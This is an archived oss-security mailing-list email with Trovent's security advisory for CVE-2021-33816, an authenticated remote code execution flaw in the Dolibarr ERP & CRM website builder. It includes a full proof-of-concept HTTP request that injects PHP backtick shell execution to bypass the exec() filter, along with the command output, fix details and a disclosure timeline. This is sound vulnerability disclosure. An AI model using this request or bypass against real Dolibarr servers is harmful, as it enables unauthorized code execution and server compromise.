X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5842" "Wednesday" "10" "November" "2021" "11:40:41" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" nil "196" "[oss-security] Trovent Security Advisory 2106-01 / CVE-2021-33816: Authenticated remote code execution in Dolibarr ERP & CRM" nil nil nil "11" nil nil (number mark "U       s.pietsch@tr Nov 10  196/5842  " thread-indent "\"[oss-security] Trovent Security Advisory 2106-01 / CVE-2021-33816: Authenticated remote code execution in Dolibarr ERP & CRM\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Trovent Security Advisory 2106-01 / CVE-2021-33816: Authenticated remote code execution in Dolibarr ERP & CRM" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1993 invoked by uid 550); 10 Nov 2021 11:44:18 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 32725 invoked from network); 10 Nov 2021 11:40:59 -0000
Date: Wed, 10 Nov 2021 11:40:41 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
	s=protonmail; t=1636544443;
	bh=+0R3/Pxm00m19je2Os8SqbUhDRWFG90tl3ceZEawX9s=;
	h=Date:To:From:Reply-To:Subject:From;
	b=E7Vb0cHTADwyXsZSTNlfCB+Ygmhpn2U7a7N3+cgcOIq4We/f03x5VJXC89H8EEwsy
	 HzATHiS5K8Qru+iKITwFQvj70C4/sodwmSxVMcKQUTpqM5N1T2Ix0VFvVMCYQNfVcG
	 EggzWNmIllqgmzk5u2PvOfZIHNEFf1fy2tdPM7PlTrTfgtULgfXF+jwybb0XNXiW5Q
	 lzFL0s1x6AED/nUoIlsGF+JLA/jSTQ0AIYTC0gyaZMtOV/ewF52eFTXOhYAAwWhZXS
	 qAhhLRtiKadOoXMlHqYLiu/5QHwrdCMfDdlSVTNCFHW1hpiXKWfw1elTKBYeN+I/Va
	 pPRax6B09XhSQ==
To: Packet Storm <submissions@packetstormsecurity.com>, Full Disclosure <fulldisclosure@seclists.org>, oss-security <oss-security@lists.openwall.com>
From: Stefan Pietsch <s.pietsch@trovent.io>
Message-ID: <A8hHfMk2fHN6wpAjOxqa33utuQ8_U_miKty_tYxSX0aucRF-238gdc8_z60udBllsgJsAPVb1X6fgZbSSklHa_WHGrwoQ9gzGSmzEEza0Zk=@trovent.io>
MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="------1399496223042e777c4ad49e1593e5c920f73d4368df942df3f30bfa771350e8"; charset=utf-8
Subject: [oss-security] Trovent Security Advisory 2106-01 / CVE-2021-33816: Authenticated remote code execution in Dolibarr ERP & CRM

--------1399496223042e777c4ad49e1593e5c920f73d4368df942df3f30bfa771350e8
Content-Type: multipart/mixed;boundary=---------------------3f654895839f51fb836ee27e7688d2f7

-----------------------3f654895839f51fb836ee27e7688d2f7
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;charset=utf-8

# Trovent Security Advisory 2106-01 #
#####################################


Authenticated remote code execution in Dolibarr ERP & CRM
#########################################################


Overview
########

Advisory ID: TRSA-2106-01
Advisory version: 1.0
Advisory status: Public
Advisory URL: https://trovent.io/security-advisory-2106-01
Affected product: Dolibarr ERP & CRM
Tested versions: Dolibarr 13.0.2
Vendor: Dolibarr foundation, https://www.dolibarr.org
Credits: Trovent Security GmbH, Nick Decker


Detailed description
####################

During our security research Trovent Security discovered
that the Dolibarr application on default settings allows remote code execut=
ion
in the website builder module. When trying to use statements like "exec()",
"system()" or "shell_exec()" the application blocks them correctly.
But we were able to execute code using "``" (backticks) which is the same as
"shell_exec()" or "echo fread(popen('/bin/ls /', 'r'), 4096);".

Severity: Critical
CVSS Score: 9.1 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)
CWE ID: CWE-94
CVE ID: CVE-2021-33816


Proof of concept
################

This is the HTTP request that creates a website with the malicious code:

REQUEST:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


POST /website/index.php HTTP/1.1
Host: 10.11.9.80
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox=
/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,image/webp,=
*/*;q=3D0.8
Accept-Language: en-US,en;q=3D0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=3D---------------------------24=
3035796342141148842632336365
Content-Length: 937
Origin: http://10.11.9.80
Connection: close
Referer: http://10.11.9.80/website/index.php
Cookie: DOLSESSID_736206a821984837877b8a6a901910d2=3Dv459clrdeu91pfc20se8s0=
rg4d; DOLUSERCOOKIE_boxfilter_task=3Dall-securitytest-for-dolibarr
Upgrade-Insecure-Requests: 1

- -----------------------------243035796342141148842632336365
Content-Disposition: form-data; name=3D"token"

f8c257168a5ae06fd1aee2ba4c45ebf9
- -----------------------------243035796342141148842632336365
Content-Disposition: form-data; name=3D"backtopage"


- -----------------------------243035796342141148842632336365
Content-Disposition: form-data; name=3D"action"

updatesource
- -----------------------------243035796342141148842632336365
Content-Disposition: form-data; name=3D"website"

test
- -----------------------------243035796342141148842632336365
Content-Disposition: form-data; name=3D"pageid"

1
- -----------------------------243035796342141148842632336365
Content-Disposition: form-data; name=3D"update"

Save
- -----------------------------243035796342141148842632336365
Content-Disposition: form-data; name=3D"PAGE_CONTENT"

<?php
echo `uname -a`;
?>
- -----------------------------243035796342141148842632336365--


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~




CODE:

The website now displays the output of the command:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


[...]
<div id=3D"websitecontentundertopmenu" class=3D"websitecontentundertopmenu =
boostrap-iso">
<!-- style of website from file -->
<style scoped=3D"">
/* Include website CSS file */
/* CSS content (all pages) */
body.bodywebsite { margin: 0; font-family: 'Open Sans', sans-serif; }
.bodywebsite h1 { margin-top: 0; margin-bottom: 0; padding: 10px;}/* Includ=
e style from the HTML header of page */

</style>
<div id=3D"divbodywebsite" class=3D"bodywebsite bodywebpage-tsets">

Linux ec9465c86e5e 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x8=
6_64 GNU/Linux

</div></div>
[...]


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


Solution / Workaround
#####################

We recommend to disable the 'websites' module in Dolibarr until a fixed ver=
sion
is deployed.

Fixed in Dolibarr version 14.0.0, verified by Trovent.


History
#######

2021-06-01: Vulnerability found
2021-06-02: CVE ID requested
2021-06-03: CVE ID received
2021-06-09: Vendor contacted
2021-06-10: Vendor reported the vulnerability as fixed
2021-11-08: Add information about fixed version
2021-11-10: Advisory published

-----------------------3f654895839f51fb836ee27e7688d2f7--

--------1399496223042e777c4ad49e1593e5c920f73d4368df942df3f30bfa771350e8
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: ProtonMail

wsFzBAEBCAAGBQJhi6+rACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
/h6Fjrd8lg/9FNkbgDSqKnwOed6n9Lbo0wfj5ku2NPwwGcNBHx1mVthDNU7t
F5aVTxUqU3N5ZuEYusITW2jaI1PM5ZanbZGlImcVhaMfyR0IudTf0hKeisR9
TDZqZ2Y3k0vlF78fhvi0oX4rA7+bDNcPrNRdufjmsGwcPFnt3CSAm2/WvphH
zw2fQcv59DD+k5SrsQqqL7135mRzhZQb4DMSHeJD+6Y/igMQkoAY28ZUpvsp
yBSbFDX7XntRzhoSmD3JLLJghHuTHG5xB8UyK++KlIj8OHt0ePr3NuS7eVr3
PyS5bywDn8eezBCGcmMcXNpiYX9dPnkB31d5z7YPaqC0f/tFdoe4zQyuoDpX
UaTTKeAPsy1iVTA0F1WsVHl7khCEfcdwPDE5RJzwG38AQllI91PvEPqpwkxZ
waVpAK53Zf2JgYYxqs00s13pQa1z6kD2FZgZkJR8G9KmkUHqOsvJy3ac2ChC
jD4L4rOSefNPDzuCurM2J17ULUq5TQk8E1GT4SjBEMBy131UOuBucyG+6SWx
tDpyTzaLmfMj8erNCS87OGnEZdXCJZxT0KHieDb9K7ScstaIOauMHuGMuEvM
DTIK20x/QhXJTV/BT1pQgaUO9uS7i0Kk3YXzAhhWvKdT5T4Bx427hYgl7dNL
qiv+QM/We8Ez8syX6wNZxWm/PpxWpru3v3A=
=0234
-----END PGP SIGNATURE-----


--------1399496223042e777c4ad49e1593e5c920f73d4368df942df3f30bfa771350e8--

